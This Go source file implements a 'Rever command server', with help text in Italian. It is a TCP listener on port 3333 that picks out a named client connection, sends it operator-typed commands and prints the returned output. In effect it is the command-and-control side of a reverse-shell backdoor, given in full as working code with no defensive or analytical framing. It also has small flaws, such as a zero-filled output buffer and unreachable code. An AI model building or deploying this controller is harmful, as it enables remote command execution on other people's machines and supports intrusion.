package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

const (
	CONN_PORT = "3333"
	CONN_TYPE = "tcp"
)

func main() {
	csl := make(chan string)
	handle := make(chan string)
	block := 0
	// Listen for incoming connections.
	l, err := net.Listen(CONN_TYPE, ":"+CONN_PORT)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	// Close the listener when the application closes.
	defer l.Close()
	fmt.Println("Listening on " + ":" + CONN_PORT)
	go console(csl, handle, &block)

	for {
		if block == 0 {
			conn, err := l.Accept()
			if err != nil {
				fmt.Println("Error accepting: ", err.Error())
				os.Exit(1)
			}

			select {
			case req := <-csl:
				buf := make([]byte, 1024)
				n, _ := conn.Read(buf)
				client := string(buf[:n])
				fmt.Println("New connection ", req, client)
				if strings.Compare(req, client) == 0 {
					fmt.Println("Lock connection...")
					block = 1

					go handleRequest(conn, csl, handle)
					csl <- "ok"
				} else {
					fmt.Println("Unlock connections...")
					block = 0

					conn.Close()
				}
			default:
				conn.Close()
			}

		}
		time.Sleep(3 * time.Second)
	}
}

func handleRequest(conn net.Conn, csl chan string, handle chan string) {
	fmt.Println("ok handle")
	for {
		command := <-handle
		if strings.Compare(command, "quit\n") == 0 {
			conn.Write(to_byte(command))
			conn.Close()
			return
		}
		if strings.Compare(command, "exit\n") == 0 {
			conn.Close()
			return
		}
		conn.Write(to_byte(command))
		buf := make([]byte, 256)
		cmd_output := make([]byte, 256)
		for {
			reqLen, _ := conn.Read(buf)
			if reqLen < 256 {
				cmd_output = append(cmd_output, buf[:reqLen]...)
				break
			} else {
				cmd_output = append(cmd_output, buf[:reqLen]...)
			}
		}
		handle <- string(cmd_output[:len(cmd_output)])
	}
	conn.Close()
}

func help() {
	fmt.Println("##############################################################")
	fmt.Println("##############Rever command server############################")
	fmt.Println("")
	fmt.Println("Comandi controllo server:")
	fmt.Println("Immettere il nome del client desiderato e attendere la connessiome")
	fmt.Println("help: visualizza l'help")
	fmt.Println("Comandi di controllo client:")
	fmt.Println("exit: chiude la connessione con il client")
	fmt.Println("quit: Chiude il client")
	fmt.Println("")
	fmt.Println("##############################################################")
}

func to_byte(f string, args ...interface{}) []byte {
	return []byte(fmt.Sprintf(f, args...))
}

func console(csl chan string, handle chan string, block *int) {
	var client string
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Client: ")
		client, _ = reader.ReadString('\n')
		if strings.Compare(client, "help\n") == 0 {
			help()
		} else {
			csl <- client[:len(client)-1]
			for {
				select {
				case status := <-csl:
					if strings.Compare(status, "ok") == 0 {
						fmt.Println("ok")
						for {
							fmt.Printf("Command for %s: ", client[:len(client)-1])
							cmd, _ := reader.ReadString('\n')
							if strings.Compare(cmd, "quit\n") == 0 {
								fmt.Println("Chiudo...")
								handle <- cmd
								fmt.Println("Unlock connection...")
								*block = 0
								break
							}
							if strings.Compare(cmd, "exit\n") == 0 {
								fmt.Println("Esco...")
								handle <- cmd
								fmt.Println("Unlock connection...")
								*block = 0
								break
							}
							if strings.Compare(cmd, "help\n") == 0 {
								help()
							}
							handle <- cmd
							result := <-handle
							fmt.Println(result)
						}
						fmt.Print("New Client: ")
						client, _ = reader.ReadString('\n')
					} else {
						fmt.Println("ko")
					}

				default:
					csl <- client[:len(client)-1]
				}
			}
		}
	}
}
